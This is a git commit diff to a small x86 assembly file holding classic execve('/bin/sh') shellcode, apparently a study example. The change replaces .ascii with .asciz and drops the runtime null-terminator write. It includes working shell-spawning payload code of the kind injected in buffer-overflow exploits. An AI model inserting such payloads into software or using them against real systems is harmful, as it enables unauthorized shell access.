34a005a5660504afd71f3aacaf499dfa837947f4
danielhenrymantilla <daniel.henry.mantilla@gmail.com>
2017-07-12 21:56:38 +0200

    Simplified basic dummy example

--- shellcode.s
+++ shellcode.s
@@ -4,14 +4,13 @@
 .globl _start
 _start:
 	call code		# push %eip; jmp code
-	.ascii "/bin/sh"
+	.asciz "/bin/sh"
 code:
 	push $11		# sys_execve
 	pop %eax		# 1st arg
 	pop %ebx		# 2nd arg: address of '/bin/sh'
 	cdq			# 4rd arg: NULL (env)
 	movl %edx, %ecx		# 3th arg: NULL (argv)
-	movb %dl, 0x7(%ebx)	# Null string terminator
 	int $0x80		# syscall
 
 
